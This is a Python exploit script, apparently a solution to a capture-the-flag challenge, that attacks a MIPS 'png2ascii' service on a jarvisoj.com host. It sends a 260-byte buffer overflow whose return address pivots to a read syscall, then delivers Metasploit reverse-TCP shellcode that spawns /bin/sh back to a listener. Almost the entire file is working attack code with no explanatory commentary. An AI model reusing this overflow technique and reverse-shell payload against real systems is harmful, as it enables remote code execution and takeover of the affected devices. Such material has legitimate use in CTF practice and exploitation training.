#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

import struct
import socket
import sys
 
# msfpayload linux/mipsle/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444
shellcode = (
        "\xef\xff\x09\x24\xff\xff\x10\x05\x82\x82\x08\x28\x27\x48"
        "\x20\x01\x21\xc8\x3f\x01\x48\x85\xb9\xaf\x48\x85\xb9\x23"
        "\x00\x00\x1c\x3c\x00\x00\x9c\x27\x21\xe0\x99\x03\x00\x00"
        "\x89\x8f\xd8\xff\xbd\x27\xe8\x00\x2a\x25\x04\x00\x47\x8d"
        "\xe8\x00\x28\x8d\x00\x01\x04\x3c\x7f\x00\x83\x34\x18\x00"
        "\xb9\x27\x02\x00\x06\x24\x11\x5c\x05\x24\x08\x00\xa6\xa7"
        "\x0a\x00\xa5\xa7\x18\x00\xa8\xaf\x1c\x00\xa7\xaf\x0c\x00"
        "\xa3\xaf\x20\x00\xb9\xaf\x24\x00\xa0\xaf\x02\x00\x04\x24"
        "\x02\x00\x05\x24\x21\x30\x00\x00\x57\x10\x02\x24\x0c\x00"
        "\x00\x00\x21\x18\x40\x00\xff\xff\x02\x24\x1a\x00\x62\x10"
        "\x01\x00\x04\x24\x21\x20\x60\x00\x08\x00\xa5\x27\x10\x00"
        "\x06\x24\x4a\x10\x02\x24\x0c\x00\x00\x00\x0e\x00\x40\x14"
        "\x21\x28\x00\x00\xdf\x0f\x02\x24\x0c\x00\x00\x00\x01\x00"
        "\x05\x24\xdf\x0f\x02\x24\x0c\x00\x00\x00\x02\x00\x05\x24"
        "\xdf\x0f\x02\x24\x0c\x00\x00\x00\x21\x30\x00\x00\x21\x20"
        "\x20\x03\x20\x00\xa5\x27\xab\x0f\x02\x24\x0c\x00\x00\x00"
        "\x21\x20\x00\x00\xa1\x0f\x02\x24\x0c\x00\x00\x00\x08\x00"
        "\xe0\x03\x28\x00\xbd\x27\xa1\x0f\x02\x24\x0c\x00\x00\x00"
        "\xe5\xff\x00\x10\x21\x20\x60\x00\x2f\x62\x69\x6e\x2f\x73"
        "\x68\x00\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
        "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
        "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
        "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
        "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
        "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
)
 
retAddr = struct.pack("<I", 0x40f968)
 
def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("pwn2.jarvisoj.com", 9890))
    print(s.recv(4096))
 
    s.send(b"png2ascii\n")
    print(s.recv(4096))
   
    payload  = "\x00" * (260)
    payload += retAddr                          # return on code performing read syscall
    payload += struct.pack("<I", 0x04)          # filedescriptor
    payload += struct.pack("<I", 0x10000000)    # destination address
    payload += struct.pack("<I", 0x400)         # read size
    payload += "EEEEFFFFGGGGHHHHIIII"           # junk arguments
    payload += struct.pack("<I", 0x10007ccc)    # goes into gp
    payload += "\n"
 
    # Send first stage payload
    s.send(payload)
 
    # Send second stage payload
    s.send(struct.pack("<I", 0x10000004) + shellcode)
 
    print(s.recv(8192))
    print(s.recv(8192))
    print(s.recv(8192))
    s.close()
 
if __name__ == "__main__":
    exploit()